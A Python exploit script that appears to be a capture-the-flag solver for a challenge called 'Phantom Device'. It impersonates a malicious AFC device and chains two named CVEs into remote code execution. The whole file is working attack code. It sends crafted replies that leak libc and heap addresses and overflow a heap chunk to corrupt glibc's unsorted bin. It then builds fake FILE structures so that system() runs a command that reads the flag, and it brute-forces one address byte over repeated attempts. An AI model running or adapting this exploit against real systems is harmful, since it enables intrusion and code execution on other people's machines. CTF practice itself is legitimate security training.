#!/usr/bin/env python3
"""Phantom Device — optimized solver. CVE-2026-116258 + CVE-2026-116261 → RCE."""
import argparse, os, random, socket, struct, sys, time

AFC_MAGIC = b"CFA6LPAA"
HDR = 40

OP_STATUS, OP_DATA, OP_READ_DIR = 0x01, 0x02, 0x03
OP_GET_FILE_INFO, OP_GET_DEVINFO = 0x0A, 0x0B
OP_FILE_OPEN, OP_FILE_OPEN_RES, OP_FILE_READ, OP_FILE_CLOSE = 0x0D, 0x0E, 0x0F, 0x14

MAIN_ARENA      = 0x204AC0
SYSTEM          = 0x058750
IO_LIST_ALL     = 0x2054C0
IO_WFILE_JUMPS  = 0x203228

V_OFFSET        = 0x15B0
S_LEN, P_LEN, C_LEN = 72, 0x418, 0x408
V_SIZE          = 0x410
OVF_ALLOC, OVF_LEN  = 0x50, 0x80
P_CHUNK_SZ      = 0x430

CMD = b"  cat /flag* >&0"

pack = struct.pack
unpack = struct.unpack
pack_into = struct.pack_into


def resolve(libc_path):
    global MAIN_ARENA, SYSTEM, IO_LIST_ALL, IO_WFILE_JUMPS
    if libc_path is None:
        here = os.path.dirname(os.path.abspath(__file__))
        for rel in ["../../../docker/libs/libc.so.6", "../../../files/libc.so.6", "libc.so.6"]:
            p = os.path.join(here, rel)
            if os.path.exists(p):
                libc_path = p
                break
    if not libc_path or not os.path.exists(libc_path):
        return
    try:
        from pwn import ELF
        e = ELF(libc_path, checksec=False)
        for name, attr in [("system","SYSTEM"),("_IO_list_all","IO_LIST_ALL"),("_IO_wfile_jumps","IO_WFILE_JUMPS"),("main_arena","MAIN_ARENA")]:
            v = e.symbols.get(name, 0)
            if v: globals()[attr] = v
    except Exception:
        pass


def recv_exact(s, n):
    buf = bytearray(n)
    view = memoryview(buf)
    pos = 0
    while pos < n:
        got = s.recv_into(view[pos:])
        if not got:
            raise EOFError
        pos += got
    return bytes(buf)


def recv_pkt(s):
    h = recv_exact(s, HDR)
    _, ent, thi, pkt, op = unpack("<8sQQQQ", h)
    body = recv_exact(s, thi - HDR) if thi > HDR else b""
    return pkt, op, body


def send_pkt(s, pkt, op, body=b""):
    total = HDR + len(body)
    s.sendall(pack("<8sQQQQ", AFC_MAGIC, total, total, pkt, op) + body)


def send_overflow(s, pkt, op, body, alloc):
    s.sendall(pack("<8sQQQQ", AFC_MAGIC, HDR + alloc, HDR + len(body), pkt, op) + body)


def send_sized(s, pkt, op, body, sz):
    ent = HDR + sz
    thi = max(HDR + len(body), ent)
    data = body.ljust(sz, b"\x00")[:sz]
    s.sendall(pack("<8sQQQQ", AFC_MAGIC, ent, thi, pkt, op) + data)


def nul_join(strings):
    return b"\x00".join(s if isinstance(s, bytes) else s.encode() for s in strings) + b"\x00"


def build_fsop(sys_addr, wj, vc):
    p = bytearray(V_SIZE)

    # FILE1: skip flush (_vtable_offset!=0), chain → FILE2
    pack_into("<Q", p, 0x58, vc + 0xF0)     # _chain → FILE2
    pack_into("<Q", p, 0x78, vc + 0x390)    # _lock
    pack_into("<Q", p, 0x90, vc + 0x30)     # _wide_data → zeros
    pack_into("<i", p, 0xB0, 1)             # _mode > 0
    p[0x72] = 1                              # _vtable_offset

    # FILE2: triggers system(CMD)
    f = 0xF0
    p[f:f+len(CMD)] = CMD
    pack_into("<Q", p, f+0x20, 0)           # _write_base
    pack_into("<Q", p, f+0x28, 1)           # _write_ptr > _write_base
    pack_into("<Q", p, f+0x68, 0)           # _chain = NULL
    pack_into("<I", p, f+0x70, 1)           # _fileno
    p[f+0x82] = 0                            # _vtable_offset = 0
    pack_into("<Q", p, f+0x88, vc + 0x3C0)  # _lock
    pack_into("<Q", p, f+0xA0, vc + 0x200)  # _wide_data
    pack_into("<i", p, f+0xC0, 0)           # _mode = 0
    pack_into("<Q", p, f+0xD8, wj)          # _vtable → _IO_wfile_jumps

    # _IO_wide_data at +0x200
    pack_into("<Q", p, 0x218, 0)             # _wide_write_base
    pack_into("<Q", p, 0x230, 0)             # _wide_buf_base
    pack_into("<Q", p, 0x2E0, vc + 0x300)   # _wide_vtable

    # fake wide vtable at +0x300: __doallocate → system
    pack_into("<Q", p, 0x368, sys_addr)

    return bytes(p)


def leak_libc(handle):
    for off in (0x60,0x70,0x80,0x90,0xA0,0xB0,0x10,0x20,0x30,0x40,0x50):
        target = MAIN_ARENA + off
        corrected = (handle & ~0xFF) | (target & 0xFF)
        base = corrected - target
        if 0 < base < (1 << 48) and (base & 0xFFF) == 0:
            return base
    return None


def attempt(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    libc_base = heap_base = None
    byte0 = random.randint(0, 255)
    rddir = fopen = fread = fclose = 0
    triggered = False

    try:
        while True:
            pkt, op, body = recv_pkt(s)

            if op == OP_READ_DIR:
                rddir += 1
                if rddir == 1:
                    send_pkt(s, pkt, OP_DATA, nul_join([
                        "S" * S_LEN, "P" * P_LEN, "..", "C" * C_LEN, "X" * 120, "."]))
                elif rddir == 2:
                    strs = []
                    for i in range(6):
                        strs += [chr(0x41+i), f"m{i:023d}"]
                    strs += ["Q"*60, "R"*60]
                    send_pkt(s, pkt, OP_DATA, nul_join(strs))
                elif rddir == 3:
                    send_pkt(s, pkt, OP_DATA, nul_join([f"d{i:02d}" for i in range(7)]))
                else:
                    send_pkt(s, pkt, OP_DATA, nul_join([".",".."]))

            elif op == OP_GET_DEVINFO:
                send_pkt(s, pkt, OP_DATA, nul_join(["A"*2000, "B"*7]))

            elif op == OP_GET_FILE_INFO:
                send_pkt(s, pkt, OP_DATA, nul_join(["st_ifmt","S_IFREG"]))

            elif op == OP_FILE_OPEN:
                fopen += 1
                if fopen <= 2:
                    send_pkt(s, pkt, OP_FILE_OPEN_RES, b"\x42")
                elif fopen == 3:
                    if libc_base is None:
                        s.close()
                        return None, byte0
                    vc = heap_base + V_OFFSET
                    fsop = build_fsop(libc_base + SYSTEM, libc_base + IO_WFILE_JUMPS, vc)
                    payload = pack("<Q", 0xCAFE0003) + fsop[8:]
                    send_sized(s, pkt, OP_FILE_OPEN_RES, payload, V_SIZE)
                else:
                    send_pkt(s, pkt, OP_FILE_OPEN_RES, pack("<Q", fopen))

            elif op == OP_FILE_READ:
                fread += 1
                handle = unpack("<Q", body[:8])[0]
                if fread == 1:
                    libc_base = leak_libc(handle)
                    send_pkt(s, pkt, OP_DATA, b"A" * 8)
                elif fread == 2:
                    partial = handle & ~0xFF
                    heap_base = (partial | byte0) << 12
                    send_pkt(s, pkt, OP_DATA, b"A" * 8)
                elif fread == 3:
                    if libc_base is None:
                        send_pkt(s, pkt, OP_DATA, b"\x00" * 16)
                    else:
                        io_la = libc_base + IO_LIST_ALL
                        ma = libc_base + MAIN_ARENA
                        bh = ma + 0x70 + 63*16 - 0x10
                        ovf = bytearray(OVF_LEN)
                        ovf[0:OVF_ALLOC] = b"\x41" * OVF_ALLOC
                        pack_into("<Q", ovf, 0x50, 0)
                        pack_into("<Q", ovf, 0x58, P_CHUNK_SZ | 1)
                        pack_into("<Q", ovf, 0x60, bh)
                        pack_into("<Q", ovf, 0x68, bh)
                        pack_into("<Q", ovf, 0x70, io_la - 0x28)
                        pack_into("<Q", ovf, 0x78, io_la - 0x20)
                        send_overflow(s, pkt, OP_DATA, bytes(ovf), OVF_ALLOC)
                        triggered = True
                else:
                    send_pkt(s, pkt, OP_DATA, b"A" * 16)

            elif op == OP_FILE_CLOSE:
                fclose += 1
                if fclose == 1:
                    send_sized(s, pkt, OP_STATUS, pack("<Q", 0) + b"\x00"*0x4B8, 0x4C0)
                else:
                    send_pkt(s, pkt, OP_STATUS, pack("<Q", 0))
                if triggered and fclose >= 3:
                    break
            else:
                send_pkt(s, pkt, OP_DATA, b"")

    except (EOFError, ConnectionError, OSError):
        pass

    captured = b""
    if triggered:
        try:
            s.settimeout(3)
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                captured += chunk
        except Exception:
            pass

    s.close()
    return captured, byte0


def exploit(host, port, max_n=768, libc_path=None):
    resolve(libc_path)
    print(f"[*] target={host}:{port}  brute=1/256  max={max_n}")
    print(f"[*] offsets: system={SYSTEM:#x} main_arena={MAIN_ARENA:#x} "
          f"io_list_all={IO_LIST_ALL:#x} wfile_jumps={IO_WFILE_JUMPS:#x}")

    t0 = time.time()
    for i in range(1, max_n + 1):
        try:
            data, b0 = attempt(host, port)
        except Exception:
            time.sleep(0.5)
            continue

        if data and b"CSCTF{" in data:
            idx = data.index(b"CSCTF{")
            flag = data[idx:data.index(b"}", idx)+1].decode()
            dt = time.time() - t0
            print(f"\n[+] RCE at attempt #{i}  byte0=0x{b0:02x}  time={dt:.1f}s")
            print(f"[+] FLAG: {flag}")
            return flag

        sys.stdout.write(f"\r[*] {i}/{max_n}  byte0=0x{b0:02x}")
        sys.stdout.flush()

    print(f"\n[-] failed after {max_n} attempts ({time.time()-t0:.1f}s)")
    return None


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Phantom Device solver")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("-n", type=int, default=768, help="max attempts")
    ap.add_argument("-l", "--libc", help="path to libc.so.6")
    args = ap.parse_args()
    flag = exploit(args.host, args.port, args.n, args.libc)
    sys.exit(0 if flag else 1)
